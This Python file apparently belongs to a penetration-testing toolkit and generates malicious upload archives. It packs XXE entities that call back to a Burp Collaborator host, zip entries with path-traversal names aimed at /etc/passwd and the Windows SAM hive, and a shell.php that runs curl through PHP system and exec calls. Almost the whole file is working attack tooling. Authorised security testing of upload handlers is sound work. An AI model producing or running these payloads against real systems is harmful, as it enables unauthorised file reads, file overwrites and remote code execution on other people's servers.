from pathlib import Path
import zipfile
import tempfile

def generate_archive_payloads(output_dir, ext, burp_collab):
    output_dir = Path(output_dir)
    
    vulns = {
        'xxe': [
            f'<!ENTITY xxe SYSTEM "http://{burp_collab}/xxe1">',
            f'<!ENTITY xxe SYSTEM "https://{burp_collab}/xxe2">',
        ],
        'path_traversal': [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
        ],
        'rce': [
            f"<?php system('curl http://{burp_collab}/rce1'); ?>",
            f"<?php exec('curl http://{burp_collab}/rce2'); ?>",
        ],
    }
    
    if output_dir.name in ['zip', 'jar', 'epub']:
        ext = output_dir.name
        for vuln, payloads in vulns.items():
            vuln_dir = output_dir / vuln
            vuln_dir.mkdir(exist_ok=True)
            
            if vuln == 'xxe':
                for i, payload in enumerate(payloads, 1):
                    xml_content = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "http://{burp_collab}/xxe_{ext}_{i}">
]>
<root>
<data>&xxe;</data>
</root>'''
                    
                    output_file = vuln_dir / f"payload_{i}.{ext}"
                    
                    with tempfile.TemporaryDirectory() as temp_dir:
                        temp_path = Path(temp_dir)
                        xml_file = temp_path / "test.xml"
                        xml_file.write_text(xml_content)
                        
                        with zipfile.ZipFile(output_file, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
                            zip_ref.write(xml_file, 'test.xml')
            
            elif vuln == 'path_traversal':
                for i, payload in enumerate(payloads, 1):
                    output_file = vuln_dir / f"payload_{i}.{ext}"
                    
                    with tempfile.TemporaryDirectory() as temp_dir:
                        temp_path = Path(temp_dir)
                        test_file = temp_path / "test.txt"
                        test_file.write_text("test")
                        
                        with zipfile.ZipFile(output_file, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
                            zip_ref.write(test_file, payload)
            
            elif vuln == 'rce' and ext in ['zip', 'jar']:
                for i, payload in enumerate(payloads, 1):
                    output_file = vuln_dir / f"payload_{i}.{ext}"
                    
                    with tempfile.TemporaryDirectory() as temp_dir:
                        temp_path = Path(temp_dir)
                        php_file = temp_path / "shell.php"
                        php_file.write_text(payload)
                        
                        with zipfile.ZipFile(output_file, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
                            zip_ref.write(php_file, 'shell.php')

